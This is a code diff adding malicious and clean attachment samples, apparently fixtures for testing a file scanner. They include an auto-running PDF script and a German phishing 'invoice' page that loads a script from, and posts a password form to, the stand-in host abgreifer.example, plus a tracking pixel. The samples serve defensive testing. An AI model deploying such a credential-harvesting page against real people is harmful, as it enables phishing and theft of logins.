@@ -76,3 +76,16 @@ export function docxSauber() {
 }
 export const PDF_BOESE = Buffer.from("%PDF-1.4\n1 0 obj\n<< /Type /Catalog /OpenAction 2 0 R >>\nendobj\n2 0 obj\n<< /S /JavaScript /JS (app.alert(1)) >>\nendobj\ntrailer << /Root 1 0 R >>\n%%EOF\n", "latin1");
 export const PROGRAMM = Buffer.concat([Buffer.from("MZ", "latin1"), Buffer.alloc(64)]);
+
+/* HTML-Anhang (2026-09-30): erfunden, jede Adresse endet auf .example (RFC 2606). */
+export const HTML_BOESE = `<!DOCTYPE html>
+<html lang="de"><head><meta charset="utf-8"><title>Ihre Rechnung</title>
+<script src="https://abgreifer.example/sammeln.js"></script></head>
+<body><p>Bitte melden Sie sich an.</p>
+<img src="https://zaehler.example/p.gif" width="1" height="1" alt="">
+<form action="https://abgreifer.example/login" method="post"><input name="pw" type="password"></form>
+</body></html>`;
+export const HTML_SAUBER = `<!DOCTYPE html>
+<html lang="de"><head><meta charset="utf-8"><title>Einladung</title><style>p{color:#333}</style></head>
+<body><p>Wir laden Sie herzlich ein. Mehr dazu auf <a href="https://verein.example/fest">unserer Seite</a>.</p>
+<img src="bild.png"></body></html>`;  // ohne alt: für eine eigene Webseite ein Mangel, im Anhang keine Gefahr
